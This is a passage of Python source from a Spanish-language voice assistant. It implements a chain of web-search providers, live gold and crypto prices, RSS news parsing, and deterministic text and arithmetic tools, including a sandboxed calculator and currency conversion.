        except Exception:
            pass
        try:
            prox = (self._sportsdb(f"eventsnext.php?id={idt}").get("events") or [])
            if prox:
                p = prox[0]
                partes.append(
                    f"- Próximo partido: {p.get('strEvent')}, "
                    f"{self._fecha_legible(p.get('dateEvent'))} "
                    f"a las {(p.get('strTime') or '')[:5]}")
        except Exception:
            pass
        return "\n".join(partes) + "\n(fuente: TheSportsDB)" if len(partes) > 1 else ""

    # ── Cotizaciones: la cifra, no la web que la publica ──
    # Las páginas de cotización cargan el precio por JavaScript, así que el
    # scraping de DuckDuckGo devolvía su descripción SEO («tabla fácil de leer
    # con precios en tiempo real») sin un solo número. CoinGecko es pública y
    # sin clave; el oro va vía XAUT (Tether Gold), respaldado 1:1 por una onza
    # troy en custodia, que sigue al precio al contado.
    _COTIZACION_RE = re.compile(
        r"(?:precio|cotiza\w*|cu[aá]nto\s+(?:vale|cuesta|est[aá])|"
        r"est[aá]\s+(?:car[oa]|barat[oa])|c[oó]mo\s+va)\b",
        re.I,
    )
    _ACTIVOS_COTIZABLES = (
        ("oro", "tether-gold", "del oro", "por onza troy"),
        ("bitcoin", "bitcoin", "del bitcoin", ""),
        ("btc", "bitcoin", "del bitcoin", ""),
        ("ethereum", "ethereum", "del ethereum", ""),
        ("ether", "ethereum", "del ethereum", ""),
    )
    _cotiz_cache: Dict[str, Tuple[float, dict]] = {}   # TTL 10 min

    def _cotizacion_directa(self, query: str) -> str:
        """Precio al contado de oro y criptos. Cadena vacía si no aplica."""
        q = (query or "").lower()
        if not self._COTIZACION_RE.search(q):
            return ""
        activo = next((a for a in self._ACTIVOS_COTIZABLES
                       if re.search(rf"\b{a[0]}\b", q)), None)
        if not activo:
            return ""
        _, ident, nombre, unidad = activo
        ahora = time.time()
        cache = self._cotiz_cache.get(ident)
        if cache and ahora - cache[0] < 600:
            precio = cache[1]
        else:
            url = ("https://api.coingecko.com/api/v3/simple/price"
                   f"?ids={ident}&vs_currencies=eur,usd")
            req = urllib.request.Request(url, headers={"User-Agent": "Celestia/1.5"})
            with urllib.request.urlopen(req, timeout=8) as r:
                data = json.loads(r.read().decode("utf-8"))
            precio = data.get(ident) or {}
            if not precio:
                return ""
            self._cotiz_cache[ident] = (ahora, precio)
        eur, usd = precio.get("eur"), precio.get("usd")
        if not (eur or usd):
            return ""
        try:
            from zoneinfo import ZoneInfo
            sello = datetime.now(ZoneInfo(os.environ.get("CELESTIA_TZ", "Europe/Madrid")))
        except Exception:
            sello = datetime.now()
        # Un precio lleva sus dos decimales aunque sean ceros.
        def _es(n: float) -> str:
            return numero_es(n, 2, fijos=True)

        precios = []
        if eur:
            precios.append(f"{_es(eur)} €")
        if usd:
            precios.append(f"{_es(usd)} $")
        detalle = " (XAUT, respaldado por una onza troy de oro)" if ident == "tether-gold" else ""
        return (f"Cotización {nombre} ahora mismo{' ' + unidad if unidad else ''}: "
                f"{' / '.join(precios)}. Dato de {sello.strftime('%d/%m/%Y %H:%M')}, "
                f"fuente CoinGecko{detalle}.")

    # Preguntas que esperan un NÚMERO por respuesta.
    _PIDE_CIFRA_RE = re.compile(
        r"\b(?:cu[aá]nt[oa]s?|precio|cuesta|vale|cotiza\w*|"
        r"cifra|porcentaje|puntos|grados|kil[oó]metros|habitantes)\b",
        re.IGNORECASE,
    )
    # Preguntas de PRECIO en concreto: ahí sólo vale una cifra con moneda.
    _PIDE_PRECIO_RE = re.compile(
        r"\b(?:precio|cuesta|vale|cu[aá]nto\s+(?:cuesta|vale|est[aá])|"
        r"cotiza\w*|car[oa]|barat[oa])\b", re.IGNORECASE)
    _TIENE_PRECIO_RE = re.compile(
        r"\d[\d.,]*\s*(?:€|\$|USD\b|EUR\b)|[€$]\s*\d", re.IGNORECASE)
    # Una cifra de verdad: con moneda, con separador de millares o con unidad.
    _TIENE_CIFRA_RE = re.compile(
        r"\d[\d.,]*\s*(?:€|\$|USD\b|EUR\b|%|km\b|kg\b|GB\b|TB\b|MHz\b|GHz\b|"
        r"W\b|mm\b|millones?\b|mil(?:es)?\b|habitantes\b|personas\b|puntos\b)"
        r"|[€$]\s*\d"
        # Número con separador de millares: 3.497.277 habitantes, 2.115,94.
        r"|\d{1,3}(?:[.,]\d{3})+",
        re.IGNORECASE,
    )

    def _primero_los_que_traen_el_dato(self, query: str, resultados: list) -> list:
        """Si la pregunta espera un número, los resultados con cifras van antes.

        El contexto que se le pasa al modelo está recortado a 2000 caracteres:
        si los primeros resultados son propaganda («el mejor precio, entra en
        nuestra web») y la cifra está en el séptimo, se pierde por el corte.
        Reordenar es estable: no se descarta nada, sólo se cambia el orden.
        """
        if not resultados or not self._PIDE_CIFRA_RE.search(query or ""):
            return resultados
        # «¿Cuánto cuesta una RTX 5090?» ordenaba primero los resultados con
        # «32 GB» y «512 bits»: son cifras, pero no la que se pide. Cuando la
        # pregunta es de precio, sólo cuenta lo que lleva moneda.
        patron = (self._TIENE_PRECIO_RE
                  if self._PIDE_PRECIO_RE.search(query or "")
                  else self._TIENE_CIFRA_RE)
        con_cifra = [r for r in resultados if patron.search(r)]
        if not con_cifra or len(con_cifra) == len(resultados):
            return resultados
        sin_cifra = [r for r in resultados if not patron.search(r)]
        logger.info("Pregunta con cifra: %d de %d resultados la traen — van primero",
                    len(con_cifra), len(resultados))
        return con_cifra + sin_cifra

    # ── Limpiar la consulta antes de mandarla a un buscador ──
    # Hablando se dice «pues quería seguir sabiendo sobre qué pc me
    # recomiendas», y eso como consulta es basura: el buscador reparte el peso
    # entre las muletillas y devolvió un artículo de 2024 sobre ordenadores
    # para la ESO. Quitando el envoltorio quedan los términos que importan.
    _MULETILLAS_QUERY_RE = re.compile(
        r"^\s*(?:pues|oye|mira|bueno|a\s+ver|vale|entonces|y|o\s+sea|"
        r"perdona|disculpa)\b[\s,]*", re.IGNORECASE)
    _FORMULAS_QUERY_RE = re.compile(
        r"\b(?:me\s+)?(?:quer[ií]a|quiero|me\s+gustar[ií]a|necesito)\s+"
        r"(?:saber|conocer|preguntarte|seguir\s+sabiendo)\s*(?:sobre|de|si|qu[eé])?\b"
        r"|\bseguir\s+sabiendo\s+(?:sobre|de)\b"
        r"|\b(?:cu[eé]ntame|dime|expl[ií]came|h[aá]blame|inf[oó]rmame)\s+"
        r"(?:m[aá]s\s+)?(?:sobre|de|acerca\s+de)?\b"
        r"|\bqu[eé]\s+me\s+dices\s+de\b"
        r"|\b(?:me\s+)?(?:recomiendas|recomendar[ií]as|aconsejas)\b"
        # «¿me recomiendas…? si quieres búscalo» llegaba así al buscador
        r"|\bsi\s+(?:quieres|puedes)\s+(?:b[uú]sca(?:lo|la|los|las)?|m[ií]ralo)\b"
        r"|\bb[uú]sca(?:lo|la|los|las)\b"
        r"|\bpor\s+favor\b|\bporfa\b|\bgracias\b",
        re.IGNORECASE)

    def _limpiar_query_para_buscador(self, query: str) -> str:
        """Deja los términos con contenido y quita el envoltorio conversacional."""
        limpia = self._MULETILLAS_QUERY_RE.sub("", query or "")
        limpia = self._FORMULAS_QUERY_RE.sub(" ", limpia)
        limpia = re.sub(r"\s+", " ", limpia).strip(" ,.;:¿?¡!")
        # Si se ha quedado en nada, la original es mejor que un cabo suelto.
        if len(limpia.split()) < 2:
            return query
        if limpia.lower() != (query or "").lower():
            logger.info("Consulta limpiada para el buscador: %.60s", limpia)
        return limpia

    def _anclar_query_en_el_tiempo(self, query: str) -> str:
        """Añade «mes año» a las queries que piden datos de ahora mismo."""
        if re.search(r"\b20\d\d\b", query):
            return query                       # el usuario ya fijó el año
        # Se ancla salvo que la pregunta sea de las que no caducan. Antes se
        # exigía una señal explícita de actualidad y se colaban respuestas de
        # hace dos años en preguntas formuladas «de refilón».
        if (self._ES_ATEMPORAL_RE.search(query)
                and not self._PIDE_ACTUALIDAD_RE.search(query)):
            return query                       # pregunta atemporal: no tocar
        try:
            from zoneinfo import ZoneInfo
            ahora = datetime.now(ZoneInfo(os.environ.get("CELESTIA_TZ", "Europe/Madrid")))
        except Exception:
            ahora = datetime.now()
        return f"{query} {self._MESES_ES_BUSQUEDA[ahora.month - 1]} {ahora.year}"

    def buscar_web(self, query: str) -> str:
        if not HAS_REQUESTS:
            return "⚠ requests no instalado. Ejecuta: pip install requests"

        # Validar query — sin esto, "" llega a DDG y devuelve HTML no-JSON
        # que rompe json() con "Expecting value". Bug visto sesión 28.
        query = (query or "").strip()
        if not query:
            return "Dime qué quieres buscar (la consulta llegó vacía)."
        # Rechazar queries triviales que el LLM puede pasar por error cuando el
        # usuario responde con un acknowledge corto ("no", "sí", "ok"). Sin
        # esto, "no" → Wikipedia EN sobre el TLD .no de Noruega.
        _CONVERSACIONALES = {
            "no", "si", "sí", "ok", "vale", "bien", "claro", "ya", "ajá",
            "aja", "uh", "eh", "mmm", "hmm", "nada", "tal vez", "quizá",
            "quizás", "puede", "gracias",
        }
        if query.lower().strip(" .,!?¿¡") in _CONVERSACIONALES:
            return ("Eso parece una respuesta corta, no una búsqueda. "
                    "Dime qué quieres que busque.")

        # Verificar conectividad antes de intentar la búsqueda
        if self.connectivity and not self.connectivity.is_online():
            self.connectivity.queue_search(query)
            n = self.connectivity.pending_count()
            return (
                f"Sin conexión a internet. La búsqueda de '{query}' ha sido encolada "
                f"({n} {'búsqueda pendiente' if n == 1 else 'búsquedas pendientes'})."
            )

        # Si volvimos a estar en línea, limpiar la cola silenciosamente
        if self.connectivity:
            pending = self.connectivity.drain_pending()
            if pending:
                logger.info("Conexión recuperada — descartadas %d búsqueda(s) encoladas", len(pending))

        # Anclar en el tiempo las preguntas de actualidad antes de buscar.
        # Wikipedia queda fuera del anclaje: su opensearch falla si le pegas
        # el mes y el año a un título de artículo.
        self._ultimas_urls = []
        query_buscador = self._limpiar_query_para_buscador(query)
        query_fresca = self._anclar_query_en_el_tiempo(query_buscador)
        if query_fresca != query:
            logger.info("Query anclada en el tiempo: %.60s", query_fresca)

        # Cadena: DDG Instant → Wikipedia (es, luego en) → DDG HTML scraping.
        # Sesión 45 — con una pregunta de actualidad, Wikipedia va la ÚLTIMA:
        # es enciclopédica, no un periódico, y su opensearch devuelve el
        # artículo de título más parecido aunque sea de hace siete años
        # («clasificación LaLiga» → «Clasificación para la Liga de Naciones
        # Concacaf 2019-20»). Para lo atemporal sigue siendo la mejor fuente.
        _cotizacion = ("cotizacion", lambda: self._cotizacion_directa(query))
        _deportes = ("deportes", lambda: self._deportes_directo(query))
        _titulares = ("titulares", lambda: self._titulares_del_dia(query))
        _musica = ("musica", lambda: self._musica_top(query))
        _searxng = ("searxng", lambda: self._searxng(query_fresca if query_fresca != query_buscador else query_buscador))
        _ddg_fresca = ("ddg_html_fresca", lambda: self._ddg_html_scrape(query_fresca)
                       if query_fresca != query else "")
        _instant = ("ddg_instant", lambda: self._ddg_instant(query_buscador))
        _wiki_es = ("wikipedia_es", lambda: self._wikipedia_extract(query, "es"))
        _wiki_en = ("wikipedia_en", lambda: self._wikipedia_extract(query, "en"))
        _ddg = ("ddg_html", lambda: self._ddg_html_scrape(query_buscador))
        # El metabuscador delante del HTML de DuckDuckGo: varios buscadores y
        # sin captchas. Donde no está (la app de Android), sigue DuckDuckGo.
        _ddgs_fresca = ("ddgs_fresca", lambda: self._ddgs(query_fresca)
                        if query_fresca != query else "")
        _ddgs = ("ddgs", lambda: self._ddgs(query_buscador))
        _tavily = ("tavily", lambda: self._tavily(query_buscador))
        # Cada cadena en UNA línea: test_searxng y test_tavily leen el orden de aquí.
        if query_fresca != query:
            cadena = (_cotizacion, _deportes, _musica, _titulares, _searxng, _ddgs_fresca, _ddg_fresca, _instant, _ddgs, _ddg, _wiki_es, _wiki_en, _tavily)
        else:
            cadena = (_cotizacion, _deportes, _musica, _titulares, _searxng, _instant, _wiki_es, _wiki_en, _ddgs, _ddg, _tavily)
        # En la app de Android, nada de DuckDuckGo (Enzo, 4 oct 2026): busca
        # con su SearXNG, con el metabuscador o con las fuentes directas.
        if os.environ.get("CELESTIA_APP_ANDROID") == "1":
            cadena = tuple(p for p in cadena if not p[0].startswith("ddg_"))
        for proveedor, fn in cadena:
            try:
                out = fn()
            except Exception as e:
                logger.debug("buscar_web %s falló: %s", proveedor, e)
                out = ""
            if out and out.strip():
                # Si el resumen no trae lo que se pedía, se abre el primer
                # enlace y se lee el artículo. Sólo con las fuentes de
                # búsqueda: las directas (cotización, deportes, música) ya
                # devuelven el dato exacto y no hay nada que ampliar.
                if proveedor in ("searxng", "ddg_html", "ddg_html_fresca", "ddgs", "ddgs_fresca",
                                 "tavily"):
                    out = self._ampliar_leyendo_paginas(query, out.strip())
                out = out.strip()[:2500]
                # Con las direcciones enteras: el recorte de 2.500 puede dejar
                # fuera la de un resultado que el modelo sí cita bien.
                _apuntar_resultado(
                    out + "\n" + "\n".join(getattr(self, "_ultimas_urls", None) or []))
                return out
        return f"Sin resultados para: {query}"

    # ── Noticias por RSS (gratis, sin API key, tiempo real) ──
    # Antes "noticias España hoy" en buscar_web devolvía el meta-descriptor de
    # un periódico ("Sigue la última hora..."), no titulares reales. Este
    # método lee feeds RSS oficiales — son la API pública que cada medio
    # publica para que se rebote su contenido, así que es uso legítimo.

    _FEEDS_NOTICIAS = (
        # Periódicos generalistas (política, sociedad, deporte, mundo)
        ("BBC Mundo",      "https://feeds.bbci.co.uk/mundo/rss.xml"),
        ("El País",        "https://feeds.elpais.com/mrss-s/pages/ep/site/elpais.com/portada"),
        ("El Mundo",       "https://e00-elmundo.uecdn.es/elmundo/rss/portada.xml"),
        ("La Vanguardia",  "https://www.lavanguardia.com/rss/home.xml"),
        # Tech / PC / hardware — para queries específicas ("noticias de pc",
        # "hardware", "gpu", "ssd", "AMD", "Intel", "NVIDIA", etc.)
        ("HardZone",          "https://hardzone.es/feed/"),
        ("El Chapuzas Inf.",  "https://elchapuzasinformatico.com/feed/"),
        ("MuyComputer",       "https://www.muycomputer.com/feed/"),
        ("Xataka",            "https://www.xataka.com/tag/hardware/rss2.xml"),
    )

    def _parsear_rss(self, xml_text: str, fuente: str) -> list:
        """Extrae items de un RSS. Devuelve lista de dict {titulo, desc, fecha, url}."""
        try:
            root = ET.fromstring(xml_text)
        except ET.ParseError:
            return []
        items = []
        for item in root.iter("item"):
            titulo = (item.findtext("title") or "").strip()
            desc = (item.findtext("description") or "").strip()
            fecha = (item.findtext("pubDate") or "").strip()
            url = (item.findtext("link") or "").strip()
            if not titulo:
                continue
            # Limpiar HTML embebido en description (común en RSS)
            desc = re.sub(r"<[^>]+>", "", desc)
            desc = _html.unescape(desc)          # &#8230; → …, &amp; → & …
            desc = re.sub(r"\s+", " ", desc).strip()
            # Los feeds de WordPress truncan el resumen con un marcador "[…]" y
            # pegan detrás la coletilla del plugin ("La entrada X aparece primero
            # en Medio."). Cortar en el marcador elimina ambos de una vez.
            desc = re.split(r"\[\s*(?:…|\.\.\.|\[&#8230;\])\s*\]", desc)[0].strip()
            # Por si la coletilla viene sin marcador previo.
            desc = re.sub(
                r"\s*(?:La entrada\b.*?aparece primero en\b.*"
                r"|The post\b.*?appeared first on\b.*"
                r"|(?:Leer|Seguir)\s+(?:m[aá]s|leyendo)\b.*)$",
                "", desc, flags=re.I,
            ).strip()
            items.append({
                "fuente": fuente,
                "titulo": titulo,
                "desc": desc,
                "fecha": fecha,
                "url": url,
            })
        return items

    # ── Tools deterministas para razonamiento textual/aritmético ─────────────
    # El LLM no "ve" caracteres (tokeniza en pedazos) ni calcula bien.
    # Estas funciones le dan respuestas exactas en vez de aproximaciones.
    # Visto en sesión 29: "cuántas e tiene la frase X" pasó por 5→6→7→11.

    def contar_letras(self, texto: str, letra: str) -> str:
        """Cuenta apariciones de `letra` (o varias letras separadas por coma)
        en `texto`. Case-insensitive.

        Si `letra` contiene varias letras separadas por coma/espacio/'y'
        (ej. "n,m" o "n y m"), las cuenta todas y devuelve un resumen.
        """
        texto = (texto or "").strip()
        letra = (letra or "").strip().strip("'\"")
        if not texto or not letra:
            return "Necesito el texto y la letra (o subcadena) a contar."
        # Detectar múltiples letras: "n,m" o "n y m" o "n, m"
        letras_raw = re.split(r"\s*(?:,|\s+y\s+|\s+e\s+)\s*", letra)
        letras = [l.strip().strip("'\"") for l in letras_raw if l.strip().strip("'\"")]
        if len(letras) > 1:
            partes = []
            total = 0
            t_low = texto.lower()
            for l in letras:
                n = t_low.count(l.lower())
                total += n
                if n > 0:  # ocultar las que son 0 cuando hay muchas letras
                    partes.append(f"'{l}': {n}")
            # Si son ≥5 letras (probable "vocales" o similar), dar total
            if len(letras) >= 5:
                if not partes:
                    return f"No hay ninguna de esas letras en el texto."
                return (f"Total: {total} apariciones en el texto.\n"
                        f"Desglose: {', '.join(partes)}.\n"
                        f"Texto: {texto}")
            # 2-4 letras: mantener formato detallado anterior
            partes_completas = []
            for l in letras:
                n = t_low.count(l.lower())
                partes_completas.append(f"'{l}': {n} {'vez' if n == 1 else 'veces'}")
            return ("Conteo en el texto: " + ", ".join(partes_completas) + ".\n"
                    f"Texto contado: {texto}")
        # Una sola letra: marcado visual
        t_low = texto.lower()
        l_low = letra.lower()
        n = t_low.count(l_low)
        palabras_marcadas = []
        for palabra in texto.split():
            p_low = palabra.lower()
            if l_low in p_low:
                marcada = ""
                i = 0
                while i < len(palabra):
                    if p_low[i:i+len(l_low)] == l_low:
                        marcada += palabra[i:i+len(l_low)].upper()
                        i += len(l_low)
                    else:
                        marcada += palabra[i]
                        i += 1
                palabras_marcadas.append(marcada)
        if palabras_marcadas:
            return (f"La letra '{letra}' aparece {n} {'vez' if n == 1 else 'veces'} en el texto.\n"
                    f"Palabras con esa letra: {' '.join(palabras_marcadas)}")
        return f"La letra '{letra}' no aparece en el texto (0 veces)."

    def contar_palabras(self, texto: str) -> str:
        """Cuenta palabras (tokens separados por espacios) en `texto`."""
        texto = (texto or "").strip()
        if not texto:
            return "Texto vacío — 0 palabras."
        palabras = texto.split()
        return f"El texto tiene {len(palabras)} palabra{'s' if len(palabras) != 1 else ''}."

    def longitud_texto(self, texto: str, unidad: str = "caracteres") -> str:
        """Cuenta unidades en `texto`. Si `unidad='letras'`, cuenta sólo
        caracteres alfabéticos (excluye dígitos, puntuación, espacios).
        Sesión 34 (B34-1): antes siempre respondía «Caracteres: N con
        espacios, N sin espacios» aunque preguntaran «cuántas letras»."""
        texto = texto or ""
        unidad = (unidad or "caracteres").lower()
        if unidad == "letras":
            n_letras = sum(1 for c in texto if c.isalpha())
            return f"Letras: {n_letras}."
        if unidad in ("longitud", "tamaño", "tamano"):
            return f"Longitud: {len(texto)} caracteres."
        n_total = len(texto)
        n_sin_esp = len(texto.replace(" ", ""))
        return f"Caracteres: {n_total} con espacios, {n_sin_esp} sin espacios."

    def silabas(self, palabra: str) -> str:
        """Divide una palabra en sílabas y las cuenta (determinista, reglas del
        español). Sesión 37: el LLM (sobre todo el 8b) falla al silabar/contar
        sílabas porque «ve» el texto en trozos, no letra a letra. Tool por código
        → exacto con cualquier modelo."""
        raw = (palabra or "").strip()
        m = re.search(r"[A-Za-zÁÉÍÓÚÀÈÌÒÙÜáéíóúàèìòùüÑñ]+", raw)
        if not m:
            return "Dame una palabra para separarla en sílabas."
        w = m.group(0)
        sil = _silabear_es(w)
        n = len(sil)
        return f"«{w}» se divide en {n} sílaba{'s' if n != 1 else ''}: {'-'.join(sil)}"

    def calcular(self, expresion: str) -> str:
        """Evalúa una expresión aritmética de forma segura.

        Acepta: + - * / // % ** ( ) y números (int/float).
        Convierte palabras comunes: "por"→*, "entre"→/, "más"→+, "menos"→-,
        "elevado a"→**, "raíz de N"→sqrt(N).
        """
        import ast
        import math
        expr = (expresion or "").strip()
        if not expr:
            return "Dime qué quieres calcular."
        # Sesión 32 (BUG-S105): privacidad. Rechazar números estructurados
        # tipo tarjeta de crédito (4×4 dígitos), IBAN o cuentas largas. Antes,
        # «mi tarjeta es 4532-1234-5678-9012» llegaba aquí porque "\d-\d-\d-\d"
        # es expresión aritmética válida — se evaluaba a un negativo y se
        # exponía el número en el resultado.
        if re.search(r"\b\d{4}[\s\-]\d{4}[\s\-]\d{4}[\s\-]\d{4}\b", expr):
            return "No proceso números de tarjeta ni identificadores similares como expresión aritmética."
        if re.search(r"\b[A-Z]{2}\d{20,24}\b", expr):
            return "No proceso IBAN ni códigos bancarios como expresión aritmética."
        # Normalizar lenguaje natural común.
        # Sesión 31 (BUG-BC): ORDEN IMPORTANTE — las expresiones compuestas
        # («dividido entre», «multiplicado por») deben sustituirse ANTES que
        # los tokens simples («entre», «por»), o el simple los consume primero
        # y deja "dividido /" como salida sin sentido.
        sustituciones = [
            (r"\bra[íi]z\s+(?:cuadrada\s+)?de\s+", "__SQRT__ "),
            (r"\bsqrt\s*\(", "__SQRT__("),
            (r"\belevado\s+a\b", "**"),
            # Sesión 34 (B34-7): «N al cuadrado/cubo» — si N es negativo,
            # hay que envolverlo en paréntesis para que el ** se aplique
            # sobre todo el número (Python interpreta `-5**2` como `-(5**2)`).
            (r"(-\s*\d[\d.,]*)\s+al\s+cuadrado\b", r"(\1)**2"),
            (r"(-\s*\d[\d.,]*)\s+al\s+cubo\b", r"(\1)**3"),
            (r"\bal\s+cuadrado\b", "**2"),
            (r"\bal\s+cubo\b", "**3"),
            # Compuestas primero
            (r"\bdividido\s+(?:entre|por)\b", "/"),
            (r"\bmultiplicado\s+por\b", "*"),
            (r"\bsumado\s+(?:a|con)\b", "+"),
            (r"\brestado\s+(?:a|de)\b", "-"),
            # Simples después
            (r"\bpor\b", "*"),
            (r"\bentre\b", "/"),
            (r"\bm[aá]s\b", "+"),
            (r"\bmenos\b", "-"),
            (r"×", "*"),
            (r"÷", "/"),
            # 'x' como operador de multiplicación (común en español).
            # Solo cuando va entre dígitos/espacios: " x ", "3x4". Evita
            # matchear "x" como variable en frases que aún no llegan aquí.
            (r"(?<=\d)\s*[xX]\s*(?=\d)", "*"),
            # Notación europea: puntos como separador de miles (548.293).
            # Si el "." va seguido de exactamente 3 dígitos, es miles → quitar.
            # Esto antes de tratar la coma decimal.
            (r"(\d)\.(\d{3})(?=\D|$)", r"\1\2"),
            (r",(\d)", r".\1"),  # coma decimal española → punto
        ]
        norm = expr
        for pat, rep in sustituciones:
            norm = re.sub(pat, rep, norm, flags=re.I)
        # Sesión 30: bloquear funciones no soportadas (abs, min, max, pow…)
        # ANTES de la limpieza de prefijos, que silenciosamente las quitaba
        # y devolvía un resultado engañoso (caso real: 'abs(-5)' → -5).
        # `__SQRT__` es el placeholder interno de raíz, sí permitido.
        if re.search(r"(?<!\w)(?!__SQRT__\b)[A-Za-zÁ-ú_][A-Za-zÁ-ú_0-9]*\s*\(",
                     norm):
            return (f"Función no soportada en '{expresion}'. Sólo acepto "
                    f"operadores básicos + - * / ** % y raíz (sqrt).")
        # Tratar "__SQRT__ N" o "__SQRT__(N)" como sqrt(N). Sesión 32 (BUG-S107):
        # antes `[^)]+` era greedy y «raíz de 144 más 5» se convertía en
        # sqrt(144+5)≈12.21 en vez de sqrt(144)+5=17. Capturar SOLO un número
        # decimal o una expresión entre paréntesis explícitos.
        norm = re.sub(
            r"__SQRT__\s*\(([^()]+)\)",
            r"(\1)**0.5",
            norm,
        )
        norm = re.sub(
            r"__SQRT__\s*([-+]?\d[\d.,]*)",
            r"(\1)**0.5",
            norm,
        )
        # Quitar texto no-aritmético al inicio ("cuánto es", "calcula", "=")
        norm = re.sub(r"^[^\d\(\-+]*", "", norm).strip()
        norm = norm.rstrip(" ?=")
        if not norm:
            return f"No pude interpretar '{expresion}' como expresión aritmética."
        # Validar caracteres permitidos
        if not re.fullmatch(r"[\d\s+\-*/().% ]+", norm):
            return (f"No pude interpretar '{expresion}' — contiene caracteres no aritméticos. "
                    f"Acepto: + - * / ** % ( ) y números.")
        try:
            # ast.parse con modo eval + walk para validar nodos
            tree = ast.parse(norm, mode="eval")
            permitidos = (ast.Expression, ast.BinOp, ast.UnaryOp, ast.Constant,
                          ast.Add, ast.Sub, ast.Mult, ast.Div, ast.FloorDiv,
                          ast.Mod, ast.Pow, ast.USub, ast.UAdd)
            for node in ast.walk(tree):
                if not isinstance(node, permitidos):
                    return f"Operación no permitida en '{expresion}'."
            # Anti-DoS por exponenciación: `9**9**9` genera números
            # astronómicos que cuelgan el proceso. La regla es la misma que usa
            # el razonador, así que vive en UN sitio (`reasoning`) y aquí solo
            # se pregunta — cuando estaba copiada, la copia de allí se quedó
            # sin ella y el mismo mensaje mataba a Celestia por el otro camino.
            from .reasoning import motivo_potencia_peligrosa
            _peligro = motivo_potencia_peligrosa(tree)
            if _peligro:
                return (f"No calculo eso en '{expresion}' ({_peligro}) — "
                        "puede generar números enormes y bloquear el sistema.")
            resultado = eval(compile(tree, "<calc>", "eval"), {"__builtins__": {}}, {})
            # Formato: entero si es entero exacto, si no decimal con 6 cifras
            if isinstance(resultado, float) and resultado.is_integer():
                resultado = int(resultado)
            elif isinstance(resultado, float):
                resultado = round(resultado, 6)
            return f"{expr} = {resultado}"
        except ZeroDivisionError:
            return "✗ División entre cero."
        except Exception as e:
            return f"✗ No pude calcular '{expresion}': {e}"

    def porcentaje(self, parte: str, total: str) -> str:
        """Calcula «el P% de N» y lo formatea de forma legible.

        Sesión 36: antes «15% de 240» caía al LLM, que respondía crudo
        «0.15 * 240 = 36». Ahora es determinista: «El 15% de 240 es 36».
        Acepta coma decimal española y separador de miles.
        """
        def _num(s: str) -> float:
            s = (s or "").strip().replace(" ", "")
            # Separador de miles tipo "1.000" → "1000" (3 dígitos tras el punto).
            s = re.sub(r"(\d)\.(\d{3})(?=\D|$)", r"\1\2", s)
            s = s.replace(",", ".")  # coma decimal española → punto
            return float(s)

        try:
            p = _num(parte)
            n = _num(total)
        except (ValueError, TypeError):
            return f"No pude interpretar «{parte}% de {total}»."
        res = p * n / 100.0
        def _fmt(x: float) -> str:
            return numero_es(x, 6).rstrip("0").rstrip(",") if not float(x).is_integer() \
                else numero_es(x)
        return f"El {_fmt(p)}% de {_fmt(n)} es {_fmt(res)}."

    # ── Conversión de divisas (Sesión 36, S148) ───────────────────────────
    # Antes NO había tool: el LLM inventaba la tasa («100 / 1.12 = 89.28»).
    # Ahora consulta tasas REALES (open.er-api.com, sin clave) y, si no hay
    # red, responde con honestidad en vez de inventar un número.
    _DIVISA_ALIAS = {
        "dolar": "USD", "dólar": "USD", "dolares": "USD", "dólares": "USD",
        "usd": "USD", "$": "USD", "dolar estadounidense": "USD",
        "dólar estadounidense": "USD", "dólar americano": "USD", "dolar americano": "USD",
        "euro": "EUR", "euros": "EUR", "eur": "EUR", "€": "EUR",
        "libra": "GBP", "libras": "GBP", "gbp": "GBP", "£": "GBP",
        "libra esterlina": "GBP", "libras esterlinas": "GBP",
        "yen": "JPY", "yenes": "JPY", "jpy": "JPY", "¥": "JPY",
        "franco": "CHF", "francos": "CHF", "chf": "CHF", "franco suizo": "CHF",
        "real": "BRL", "reales": "BRL", "brl": "BRL", "real brasileño": "BRL",
        "yuan": "CNY", "yuanes": "CNY", "cny": "CNY", "renminbi": "CNY",
        "won": "KRW", "krw": "KRW", "rublo": "RUB", "rublos": "RUB", "rub": "RUB",
        "rupia": "INR", "rupias": "INR", "inr": "INR",
        "peso mexicano": "MXN", "pesos mexicanos": "MXN", "mxn": "MXN",
        "peso argentino": "ARS", "pesos argentinos": "ARS", "ars": "ARS",
        "peso chileno": "CLP", "pesos chilenos": "CLP", "clp": "CLP",
        "peso colombiano": "COP", "pesos colombianos": "COP", "cop": "COP",
        "peso uruguayo": "UYU", "pesos uruguayos": "UYU", "uyu": "UYU",
        "sol": "PEN", "soles": "PEN", "pen": "PEN", "sol peruano": "PEN",
        "bolivar": "VES", "bolívar": "VES", "ves": "VES",
        "dolar canadiense": "CAD", "dólar canadiense": "CAD", "cad": "CAD",
        "dolar australiano": "AUD", "dólar australiano": "AUD", "aud": "AUD",
        "corona": "SEK", "coronas": "SEK", "zloty": "PLN", "lira": "TRY", "liras": "TRY",
    }
    _tasas_cache: Dict[str, Tuple[float, dict, str]] = {}

    @staticmethod
    def _num_es(s: Any) -> float:
        """Parsea un número escrito a la española (coma decimal, punto miles)."""
        s = str(s or "").strip().replace(" ", "")
        s = re.sub(r"(\d)\.(\d{3})(?=\D|$)", r"\1\2", s)  # 1.000 → 1000
        s = s.replace(",", ".")
        return float(s)

    @classmethod
    def _norm_divisa(cls, nombre: str) -> Optional[str]:
        n = (nombre or "").strip().lower()
        n = re.sub(r"[¿?¡!.,]+$", "", n)
        return cls._DIVISA_ALIAS.get(n)

    def _tasas_divisa(self, base: str) -> Tuple[dict, str]:
        """Devuelve (rates, fecha_actualizacion) con caché TTL 1h."""
        now = time.time()
        c = self._tasas_cache.get(base)
        if c and now - c[0] < 3600:
            return c[1], c[2]
        url = f"https://open.er-api.com/v6/latest/{base}"
        req = urllib.request.Request(url, headers={"User-Agent": "Celestia/1.5"})
        with urllib.request.urlopen(req, timeout=8) as r:
            data = json.loads(r.read().decode("utf-8"))
        if data.get("result") != "success":
            raise RuntimeError("api_error")
        rates = data.get("rates", {})
        fecha = (data.get("time_last_update_utc", "") or "")[:16]
        self._tasas_cache[base] = (now, rates, fecha)
        return rates, fecha

    def convertir_divisa(self, cantidad: Any, origen: str, destino: str) -> str:
        o = self._norm_divisa(origen)
        d = self._norm_divisa(destino)
        if not o:
            return (f"No reconozco la moneda «{origen}». Puedo convertir dólares, "
                    "euros, libras, yenes, francos, reales, yuanes y varios pesos "
                    "(mexicano, argentino, chileno, colombiano).")
        if not d:
            return f"No reconozco la moneda de destino «{destino}»."
        try:
            cant = self._num_es(cantidad)
        except (ValueError, TypeError):
            return f"No entendí la cantidad «{cantidad}»."

        _fmt = numero_es

        if o == d:
            return f"{_fmt(cant)} {o} son {_fmt(cant)} {d} — es la misma moneda."
        try:
